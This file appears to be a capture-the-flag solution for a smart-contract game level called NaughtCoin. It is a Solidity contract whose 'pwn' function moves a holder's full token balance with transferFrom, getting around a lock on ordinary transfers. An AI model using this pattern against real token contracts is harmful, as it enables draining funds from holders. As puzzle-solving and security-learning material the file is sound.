// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

interface IERC20 {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoin {
    function pwn(
        address target,
        address from,
        address to
    ) external {
        IERC20 token = IERC20(target);

        uint256 balance = token.balanceOf(msg.sender);

        token.transferFrom(from, to, balance);
    }
}
